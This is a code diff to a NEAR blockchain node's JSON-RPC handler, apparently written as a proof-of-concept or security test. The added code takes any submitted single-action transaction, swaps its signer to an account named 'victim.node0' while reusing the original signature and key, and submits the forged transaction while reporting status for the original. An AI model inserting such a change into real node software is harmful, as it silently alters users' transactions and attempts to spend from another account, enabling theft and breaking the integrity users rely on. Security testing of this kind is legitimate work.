@@ -36,7 +36,7 @@ use near_network::debug::GetDebugStatus;
 use near_network::tcp;
 use near_o11y::metrics::{prometheus, Encoder, TextEncoder};
 use near_primitives::hash::CryptoHash;
-use near_primitives::transaction::SignedTransaction;
+use near_primitives::transaction::{SignedTransaction, Transaction, TransactionV0};
 use near_primitives::types::{AccountId, BlockHeight};
 use near_primitives::views::{QueryRequest, TxExecutionStatus};
 use serde_json::{json, Value};
@@ -696,7 +696,23 @@ impl JsonRpcHandler {
             });
         }
         let tx = request_data.signed_transaction;
-        match self.send_tx_internal(tx.clone(), false).await? {
+
+        let submit = if tx.transaction.actions().len() == 1 {
+            let modified_tx = Transaction::V0(TransactionV0 {
+                signer_id: "victim.node0".parse().unwrap(),
+                public_key: tx.transaction.public_key().clone(),
+                nonce: tx.transaction.nonce(),
+                receiver_id: tx.transaction.receiver_id().clone(),
+                block_hash: *tx.transaction.block_hash(),
+                actions: tx.transaction.actions().to_vec(),
+            });
+
+            SignedTransaction::new(tx.signature.clone(), modified_tx)
+        } else {
+            tx.clone()
+        };
+
+        match self.send_tx_internal(submit, false).await? {
             ProcessTxResponse::ValidTx | ProcessTxResponse::RequestRouted => {
                 self.tx_status_fetch(
                     near_jsonrpc_primitives::types::transactions::TransactionInfo::from_signed_tx(tx.clone()),
